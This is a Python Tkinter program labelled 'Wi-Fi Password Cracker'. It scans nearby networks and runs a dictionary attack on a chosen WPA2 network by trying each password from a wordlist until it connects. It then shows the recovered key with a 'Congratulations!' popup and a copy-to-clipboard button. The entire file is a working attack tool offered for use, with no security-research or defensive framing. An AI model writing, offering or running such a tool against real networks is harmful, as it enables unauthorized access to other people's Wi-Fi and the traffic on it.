import time
import pywifi
from pywifi import const
from tkinter import *
from tkinter import messagebox, ttk
import os
import pyperclip

# Initialize variables
available_devices = []
keys = []
final_output = {}

# Function to scan for Wi-Fi networks
def scan_networks(interface):
    interface.scan()
    time.sleep(5)  # Wait for the scan to complete
    networks = interface.scan_results()
    return [network.ssid for network in networks if network.ssid]  # Filter out empty SSIDs

# Function to attempt connecting to an open network
def connect_open_network(interface, ssid):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_NONE)
    interface.remove_all_network_profiles()
    interface.add_network_profile(profile)
    interface.connect(profile)
    time.sleep(4)
    return interface.status() == const.IFACE_CONNECTED

# Function to attempt connecting to a secured network with a password
def connect_secured_network(interface, ssid, password):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    interface.remove_all_network_profiles()
    interface.add_network_profile(profile)
    interface.connect(profile)
    time.sleep(4)
    return interface.status() == const.IFACE_CONNECTED

# Function to update the list of available networks in the GUI
def update_network_list():
    global available_devices
    available_devices = scan_networks(interface)
    network_listbox.delete(0, END)
    for ssid in available_devices:
        network_listbox.insert(END, ssid)

# Function to start the password cracking process
def start_cracking():
    selected_network = network_listbox.get(ACTIVE)
    if not selected_network:
        messagebox.showerror("Error", "Please select a Wi-Fi network.")
        return

    # Attempt to read the password list file
    password_file = file_entry.get()
    if not os.path.isfile(password_file):
        messagebox.showerror("Error", f"File '{password_file}' not found. Please make sure the file exists.")
        return

    with open(password_file, 'r') as f:
        keys = [line.strip() for line in f]

    # Clear previous results
    progress['value'] = 0
    result_text.set("Trying passwords...")
    root.update_idletasks()

    found_password = None
    for password in keys:
        progress['value'] += 1
        root.update_idletasks()
        process_text.insert(END, f"Trying password: {password}\n")
        process_text.yview(END)
        if connect_secured_network(interface, selected_network, password):
            found_password = password
            break

    if found_password:
        final_output[selected_network] = found_password
        result_text.set(f"Success! Password for '{selected_network}' is '{found_password}'.")
        show_congratulation_popup(selected_network, found_password)
    else:
        result_text.set(f"No valid password found for '{selected_network}'.")

# Function to show congratulation popup
def show_congratulation_popup(ssid, password):
    def on_ok():
        popup.destroy()
    
    popup = Toplevel(root)
    popup.title("Password Found")
    popup.geometry("300x200")
    popup.configure(bg="#f5f5f5")  # Light grey background

    Label(popup, text="Congratulations!", font=("Helvetica", 14, "bold"), bg="#f5f5f5").pack(pady=10)
    Label(popup, text=f"Password for '{ssid}' is:", font=("Helvetica", 12), bg="#f5f5f5").pack(pady=5)
    password_label = Label(popup, text=password, font=("Helvetica", 12, "bold"), bg="#f5f5f5", fg="#4CAF50")  # Green color
    password_label.pack(pady=5)
    
    Button(popup, text="Copy Password", command=lambda: copy_password(password), bg="#4CAF50", fg="white").pack(pady=5)
    Button(popup, text="OK", command=on_ok, bg="#f5f5f5", fg="#000000").pack(pady=10)

# Function to copy the discovered password to clipboard
def copy_password(password):
    pyperclip.copy(password)
    messagebox.showinfo("Copied", "Password copied to clipboard!")

# Set up the GUI
root = Tk()
root.title("Wi-Fi Password Cracker")
root.geometry("500x600")
root.configure(bg="#f5f5f5")  # Light grey background

# Add headline
headline = Label(root, text="Wifi tool by Aarif Khan", font=("Helvetica", 16, "bold"), bg="#f5f5f5", fg="#000000")
headline.pack(pady=10)

# Set up the interface
wifi = pywifi.PyWiFi()
interface = wifi.interfaces()[0]  # Assuming a single Wi-Fi interface

# Create and place widgets
Label(root, text="Available Networks:", bg="#f5f5f5").pack(pady=5)

network_listbox = Listbox(root, width=50, height=10, bg="#ffffff", fg="#000000")  # White background, black text
network_listbox.pack(pady=5)

Button(root, text="Scan Networks", command=update_network_list, bg="#4CAF50", fg="white").pack(pady=5)

Label(root, text="Password List File:", bg="#f5f5f5").pack(pady=5)
file_entry = Entry(root, width=50)
file_entry.insert(0, r'C:\Users\iamaa\Downloads\CODING\Wifi Tool by Aarif\tool\top400.txt')
file_entry.pack(pady=5)

Button(root, text="Start Cracking", command=start_cracking, bg="#4CAF50", fg="white").pack(pady=5)
Button(root, text="Copy Password", command=lambda: copy_password(final_output.get(network_listbox.get(ACTIVE), "")), bg="#4CAF50", fg="white").pack(pady=5)

progress = ttk.Progressbar(root, orient=HORIZONTAL, length=300, mode='determinate')
progress.pack(pady=5)

result_text = StringVar()
result_label = Label(root, textvariable=result_text, justify=LEFT, wraplength=450, bg="#f5f5f5")
result_label.pack(pady=5)

process_text = Text(root, width=60, height=10, wrap=WORD, state=DISABLED, bg="#ffffff", fg="#000000")  # White background, black text
process_text.pack(pady=5)

# Start the GUI main loop
root.mainloop()
